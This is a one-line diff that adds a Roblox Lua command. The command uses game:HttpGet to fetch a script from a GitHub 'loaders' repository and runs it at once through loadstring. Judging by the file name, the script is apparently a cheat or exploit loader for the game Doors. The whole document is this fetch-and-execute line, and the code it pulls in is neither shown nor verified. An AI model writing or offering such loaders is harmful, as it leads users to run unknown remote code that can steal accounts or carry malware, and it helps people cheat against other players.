@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/doors-spam3-g84pa6s6k4vlf6.lua"))()
